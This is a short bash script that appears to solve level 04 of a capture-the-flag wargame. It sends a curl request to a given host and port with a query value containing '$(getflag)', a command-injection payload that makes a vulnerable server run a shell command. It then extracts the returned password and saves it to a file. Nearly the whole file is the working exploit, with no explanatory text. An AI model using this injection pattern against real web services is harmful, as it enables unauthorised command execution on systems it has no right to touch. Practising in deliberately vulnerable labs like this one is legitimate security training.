#!/usr/bin/env bash

if [ ! -z "$1" ]; then

    flag=$(curl 'http://'"$1:$2"'/?x=$(getflag)')

	if [ -z "$flag" ]; then
		echo "Error: Network error"
		exit 1
	fi

    flag=$(echo $flag | awk '{print $NF}')

    echo "Password:"
    echo $flag
    echo $flag > flag04.pwd
else
    echo "Usage: ./flag04.sh <ip address> <port>"
fi
